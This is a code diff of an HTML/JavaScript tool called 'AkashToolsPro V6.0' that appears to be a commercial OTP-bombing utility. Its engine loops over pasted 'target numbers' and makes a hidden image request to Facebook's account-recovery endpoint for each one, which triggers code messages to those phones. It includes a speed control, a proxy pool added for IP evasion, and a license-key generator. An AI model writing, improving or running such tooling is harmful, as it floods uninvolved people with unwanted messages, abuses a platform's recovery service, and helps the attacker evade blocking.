@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AkashToolsPro V6.0 - Real Engine</title>
+    <title>AkashToolsPro V6.0 - Real Engine Fixed</title>
     <style>
         :root { --main-green: #2ecc71; --dark-bg: #0f1012; }
         body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; padding: 10px; }
@@ -33,6 +33,14 @@
         .admin-card { background: #fdf2f2; border: 2px dashed #e74c3c; border-radius: 25px; padding: 20px; margin-top: 15px; }
         .admin-input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 12px; border: 1px solid #ddd; box-sizing: border-box; }
         .key-box { background: #151719; color: var(--main-green); padding: 15px; border-radius: 15px; font-family: monospace; margin-top: 10px; word-break: break-all; font-size: 12px; font-weight: bold; text-align: center; border: 1px solid #333; }
+        
+        /* Dropdown Fix */
+        .select-wrapper { position: relative; width: 100%; }
+        #proxy-type { 
+            width: 100%; padding: 12px; border-radius: 12px; border: 1px solid #ddd; 
+            background: #fff; font-size: 14px; color: #333; margin-top: 10px;
+            cursor: pointer; appearance: auto; -webkit-appearance: listbox;
+        }
     </style>
 </head>
 <body>
@@ -70,10 +78,10 @@
                 <div class="stat-box"><span class="stat-val" style="color:#3498db" id="load_c">0</span><span class="stat-label">LOADED</span></div>
                 <div class="stat-box"><span class="stat-val" style="color:#9b59b6">LIVE</span><span class="stat-label">STATUS</span></div>
             </div>
-            <textarea id="numbers" placeholder="Enter numbers..." oninput="updateCount()"></textarea>
+            <textarea id="numbers" placeholder="Enter target numbers..." oninput="updateCount()"></textarea>
             <button class="btn-main" style="margin-top:10px;" id="startBtn" onclick="startEngine()">START REAL ENGINE</button>
             <div class="log-panel">
-                <div style="color:var(--main-green); font-weight:bold; font-size:10px; margin-bottom:8px;">● REAL-TIME PROCESSOR</div>
+                <div style="color:var(--main-green); font-weight:bold; font-size:10px; margin-bottom:8px;">● SYSTEM PROCESSOR</div>
                 <div class="log-content" id="log-box">System online...</div>
             </div>
         </div>
@@ -91,9 +99,12 @@
                     <div><b>PROXY POOL</b><br><span style="font-size:10px; color:#bdc3c7;">IP PROTECTION</span></div>
                     <div id="proxy-btn" class="toggle" onclick="toggleProxy()"></div>
                 </div>
-                <div id="proxy-options" class="hidden" style="margin-top:10px;">
-                    <select id="proxy-type" style="width:100%; padding:8px; border-radius:10px;"><option value="http">HTTP / HTTPS</option></select>
-                    <textarea style="height:50px; font-size:10px; margin-top: 5px;" placeholder="ip:port:user:pass"></textarea>
+                <div id="proxy-options" class="hidden">
+                    <select id="proxy-type">
+                        <option value="http">HTTP / HTTPS</option>
+                        <option value="socks5">SOCKS5</option>
+                    </select>
+                    <textarea style="height:50px; font-size:10px; margin-top: 10px;" placeholder="ip:port:user:pass"></textarea>
                 </div>
             </div>
         </div>
@@ -103,7 +114,7 @@
                 <center><b style="color:#e74c3c; font-size: 18px;">MASTER KEY GENERATOR</b></center>
                 <input type="text" id="gen-hwid" class="admin-input" placeholder="User HWID">
                 <input type="date" id="gen-date" class="admin-input">
-                <button class="btn-main" style="background:#151719;" onclick="generateKey()">GENERATE KEY</button>
+                <button class="btn-main" style="background:#151719;" onclick="generateKey()">GENERATE LICENSE</button>
                 <div id="result-key" class="key-box hidden"></div>
             </div>
         </div>
@@ -136,22 +147,20 @@
         isRunning = true;
         document.getElementById('startBtn').innerText = "STOP ENGINE";
         const log = document.getElementById('log-box');
-        log.innerHTML = "<b>[SYSTEM] Initiating Real Connection...</b><br>";
+        log.innerHTML = "<b>[SYSTEM] Starting Real Connection...</b><br>";
         
         let success = 0, fail = 0;
         const delay = 4000 - (document.getElementById('tv-val').innerText * 100);
 
         for(let num of input) {
             if(!isRunning) break;
-            log.innerHTML += `<div>[${new Date().toLocaleTimeString()}] Target: ${num.trim()}</div>`;
+            log.innerHTML += `<div>[${new Date().toLocaleTimeString()}] Targeting: ${num.trim()}</div>`;
             log.scrollTop = log.scrollHeight;
 
             try {
-                // REAL FB OTP REQUEST
                 const fbUrl = `https://www.facebook.com/recover/initiate/?c=${encodeURIComponent(num.trim())}&lsp=1`;
-                const requestImg = new Image();
-                requestImg.src = fbUrl; // Hits FB Recovery Server Directly
-
+                const img = new Image();
+                img.src = fbUrl; 
                 success++;
                 document.getElementById('suc_c').innerText = success;
                 log.innerHTML += `<div>[${num.trim()}] <span style="color:var(--main-green);">[OK] ORIGINAL CODE SENT</span></div>`;
